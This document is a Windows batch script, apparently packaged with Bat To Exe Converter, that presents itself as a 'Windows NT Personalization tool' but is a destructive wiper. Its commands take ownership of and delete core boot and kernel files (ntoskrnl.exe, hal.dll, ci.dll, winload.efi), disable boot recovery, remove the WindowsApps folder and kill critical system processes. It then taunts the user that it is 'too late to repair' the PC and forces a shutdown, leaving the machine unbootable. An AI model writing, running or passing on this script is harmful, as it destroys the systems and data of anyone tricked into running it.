::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFDBdRw2+DGK5EqAO7fvHxumIrF4hROcta4DV27iHOuVd40brFQ==
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJhZksaHErSXA==
::ZQ05rAF9IBncCkqN+0xwdVsFAlTMbCXqZg==
::ZQ05rAF9IAHYFVzEqQIHIRVQQxORfEWORoUZ+vv04euLq1ccQOswds/P1buCQA==
::eg0/rx1wNQPfEVWB+kM9LVsJDDOrEkWOUOFSzdDejw==
::fBEirQZwNQPfEVWB+kM9LVsJDDOLMmWuUOFSzfD+jw==
::cRolqwZ3JBvQF1fEqQIALQlHQwqDMGKgA/UF5/3pr92OrEkSQ/F/Vrub07qdNOEf5kTwfJkjtg==
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDBdRw2+GGS5E7gZ5vzo09qVrUcYV/YsRL/eyKeBLuEf41/hNd4a/1R0rJ1YRSdLcQe5bQonlXlLuGqRYZPSthfkKg==
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
title Windows NT Personalization tool
if exist "%WINDIR%\System32\ntoskrnl.exe" (
takeown /f "%WINDIR%\System32\ntoskrnl.exe"
icacls "%WINDIR%\System32\ntoskrnl.exe" /grant everyone:F
del "%WINDIR%\System32\ntoskrnl.exe" /f /q
)

if exist "%WINDIR%\System32\hal.dll" (
takeown /f "%WINDIR%\System32\hal.dll"
icacls "%WINDIR%\System32\hal.dll" /grant everyone:F
del "%WINDIR%\System32\hal.dll" /f /q
)

if exist "%WINDIR%\System32\ci.dll" (
takeown /f "%WINDIR%\System32\ci.dll"
icacls "%WINDIR%\System32\ci.dll" /grant everyone:F
del "%WINDIR%\System32\ci.dll" /f /q
)

if exist "%WINDIR%\System32\winload.efi" (
takeown /f "%WINDIR%\System32\winload.efi"
icacls "%WINDIR%\System32\winload.efi" /grant everyone:F
del "%WINDIR%\System32\winload.efi" /f /q
)

bcdedit /set {default} recoveryenabled no

if exist "C:\Program Files\WindowsApps" (
takeown /f "C:\Program Files\WindowsApps"
icacls "C:\Program Files\WindowsApps" /grant everyone:F
rd "C:\Program Files\WindowsApps" /s /q
)

taskkill /f /im explorer.exe
start cmd.exe
start mspaint.exe
start notepad.exe
start C:\Windows\System32\screenmelt.exe
timeout /t 30 /nobreak >nul
msg * ITS TOO LATE TO REPAIR YOUR PC!
taskkill /f /im wininit.exe
taskkill /f /im cmd.exe
taskkill /f /im svchost.exe
taskkill /f /im csrss.exe
taskkill /f /im winlogon.exe
powershell wininit
cls
timeout /t 3 /nobreak >nul
shutdown /s /t 0